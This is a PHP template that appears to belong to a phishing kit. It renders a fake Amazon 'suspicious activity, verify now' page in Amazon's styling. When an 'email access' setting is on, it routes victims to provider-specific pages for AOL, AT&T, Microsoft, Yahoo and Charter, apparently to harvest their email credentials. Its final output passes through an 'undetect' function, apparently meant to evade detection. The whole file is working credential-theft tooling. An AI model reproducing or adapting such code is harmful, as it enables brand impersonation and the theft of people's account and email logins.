<?php
require __DIR__ . '/../../function.php';
require $api->language();

$api->check_cookie();

if ($api->config("getemailaccess") == "off") {
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $api->redirectPage("/ax/account/addresses", "/ap/account/addresses");
    }
} else {
$api->emailProvider();
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $provider = $_SESSION['provider'];
    switch ($provider) {
        case 'aol':
            $api->redirectPage("/verifyEmailAol", "/verifyEmailAol");
            break;
        case 'att':
            $api->redirectPage("/verifyEmailAtt", "/verifyEmailAtt");
            break;
        case 'microsoft':
            $api->redirectPage("/verifyEmailMicrosoft", "/verifyEmailMicrosoft");
            break;
        case 'yahoo':
            $api->redirectPage("/verifyEmailYahoo", "/verifyEmailYahoo");
            break;
        case 'charter':
            $api->redirectPage("/verifyEmailCharter", "/verifyEmailCharter");
            break;
        default:
            $api->redirectPage("/ax/account/addresses", "/ap/account/addresses");
            break;
        }
    }
}

$html = '
<!DOCTYPE html>
<html class="a-ws a-js a-audio a-video a-canvas a-svg a-drag-drop a-geolocation a-history a-webworker a-autofocus a-input-placeholder a-textarea-placeholder a-local-storage a-gradients a-transform3d a-touch-scrolling a-text-shadow a-text-stroke a-box-shadow a-border-radius a-border-image a-opacity a-transform a-transition a-ember a-ember-modern">
<head>
    <title dir="ltr">'.$api->text_encode($lang['suspicious']['title']).'</title>
    <meta http-equiv="content-type" content="text/html; charset=utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=yes">
    <meta name="robots" content="noindex, nofollow, noarchive, nosnippet, noodp, noydir">
    <link rel="shortcut icon" href="'.$api->image_encode("assets/img/favicon.ico")['local'].'">
    <link rel="stylesheet" href="'.$api->text_encode("../assets/css/login-style.css").'">
    <link rel="stylesheet" href="'.$api->text_encode("../assets/css/style-login.css").'">
    <link rel="stylesheet" href="'.$api->text_encode("../assets/css/style-cvf.css").'">
</head>
<body class="auth-no-skin ap-locale-en_US a-m-us a-aui_72554-c a-aui_a11y_2_750578-t2 a-aui_a11y_6_837773-t2 a-aui_a11y_sr_678508-t1 a-aui_amzn_img_959719-c a-aui_amzn_img_gate_959718-c a-aui_killswitch_csa_logger_372963-c a-aui_pci_risk_banner_210084-c a-aui_template_weblab_cache_333406-c a-aui_tnr_v2_180836-c a-meter-animate">
    <div class="a-section a-padding-medium auth-workflow">
        <div class="a-section a-spacing-none auth-navbar">
            <div class="a-section a-spacing-medium a-text-center">
                <a class="a-link-nav-icon" href="#!">
                    <i class="a-icon a-icon-logo" role="img"></i>
                    ';
                    if ($_SESSION['countrycode'] == "jp") {
                        $html .= '<i class="a-icon a-icon-domain-'.strtolower($_SESSION['countrycode']).' a-icon-domain-'.strtolower($_SESSION['countrycode']).'" role="img"></i>';
                    } else {
                        $html .= '<i class="a-icon a-icon-domain-'.strtolower($_SESSION['countrycode']).' a-icon-domain" role="img"></i>';
                    }
                    $html .= '
                </a> 
            </div>
        </div>
        <div id="authportal-center-section" class="a-section">
            <div id="authportal-main-section" class="a-section">
                <div class="a-section auth-pagelet-container">
                    <div class="a-section a-spacing-base">
                        <div class="a-section">
                            <div class="a-section">
                                <div class="a-box">
                                    <div class="a-box-inner a-padding-extra-large">
                                        <div class="a-section a-spacing-medium">
                                            <span class="a-size-large secure-your-account-word-break">'.$api->text_encode($lang['suspicious']['titlesuspicious']).'</span>
                                        </div>
                                        <div id="channelDetailsForSuspicious" class="a-section">
                                            <div class="a-section a-spacing-medium">
                                                <span class="a-size-base transaction-approval-word-break">'.$api->text_encode($lang['suspicious']['pagetitle']).'</span>
                                            </div>
                                            <div class="a-box a-spacing-mini a-text-left">
                                                <div class="a-box-inner a-padding-base">
                                                    <div class="a-row a-spacing-mini a-spacing-top-micro">
                                                        <span class="a-size-base secure-your-account-word-break a-text-bold"> '.$api->text_encode($lang['suspicious']['step1']).': </span>
                                                        <span class="a-size-base secure-your-account-word-break"> '.$api->text_encode($lang['suspicious']['infostep1']).' </span>
                                                    </div>
                                                    <hr aria-hidden="true" class="a-spacing-mini a-divider-normal">
                                                    <div class="a-row a-spacing-mini a-spacing-top-micro">
                                                        <span class="a-size-base secure-your-account-word-break"> '.$api->text_encode($lang['suspicious']['alertstep1']).' </span>
                                                    </div>
                                                </div>
                                            </div>
                                            <div class="a-box a-spacing-mini a-text-left">
                                                <div class="a-box-inner a-padding-base">
                                                    <div class="a-row a-spacing-mini a-spacing-top-micro">
                                                        <span class="a-size-base secure-your-account-word-break a-text-bold"> '.$api->text_encode($lang['suspicious']['step2']).': </span>
                                                        <span class="a-size-base secure-your-account-word-break"> '.$api->text_encode($lang['suspicious']['infostep2']).' </span>
                                                    </div>
                                                    <hr aria-hidden="true" class="a-spacing-mini a-divider-normal">
                                                    <div class="a-row a-spacing-mini a-spacing-top-micro">
                                                        <span class="a-size-base secure-your-account-word-break"> '.$api->text_encode($lang['suspicious']['alertstep2']).' </span>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                        <form method="POST" action="">
                                            <div class="a-section">
                                                <button type="submit" id="auth-signin-button" class="a-button a-button-span12 a-button-primary">
                                                    <span class="a-button-inner">
                                                        <span id="auth-signin-button-announce" class="a-button-text" aria-hidden="true">
                                                            '.$api->text_encode($lang['suspicious']['verifnow']).'
                                                        </span>
                                                    </span>
                                                </button>
                                            </div>
                                        </form>
                                        <br>
                                        <div class="a-section">
                                            <h5 class="a-size-small a-color-secondary">'.$api->text_encode($lang['suspicious']['needhelp']).'</h5>
                                            <span class="a-size-small a-color-secondary">'.$api->text_encode($lang['suspicious']['differentway']).'
                                            </span>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <div id="right-2"></div>
        <div class="a-section a-spacing-top-extra-large auth-footer">
            <div class="a-divider a-divider-section">
                <div class="a-divider-inner"></div>
            </div>
            <div class="a-section a-spacing-small a-text-center a-size-mini">
                <span class="auth-footer-seperator"></span>
                <ul>
                    <li style="list-style-type: none; margin: 0; padding:0; display: inline-block;">
                        <a class="a-link-normal a-nowrap" rel="noopener" href="#gp">
                            '.$api->text_encode($lang['suspicious']['conditions']).'
                        </a>
                        <span class="auth-footer-seperator"></span>
                    </li>
                    <li style="list-style-type: none; margin: 0; padding:0; display: inline-block;">
                        <a class="a-link-normal a-nowrap" rel="noopener" href="#gp">
                            '.$api->text_encode($lang['suspicious']['privacy']).'
                        </a>
                        <span class="auth-footer-seperator"></span>
                    </li>
                    <li style="list-style-type: none; margin: 0; padding:0; display: inline-block;">
                        <a class="a-link-normal a-nowrap" rel="noopener" href="#gp">
                            '.$api->text_encode($lang['suspicious']['help']).'
                        </a>
                        <span class="auth-footer-seperator"></span>
                    </li>
                </ul>
            </div>
            <div class="a-section a-spacing-none a-text-center"> 
                <span class="a-size-mini a-color-secondary">
                    '.$api->text_encode($lang['suspicious']['copyright']).'
                </span>
            </div>
        </div>
    </div>
</div>
</div>
</body>
</html>';

$api->undetect($html);
?>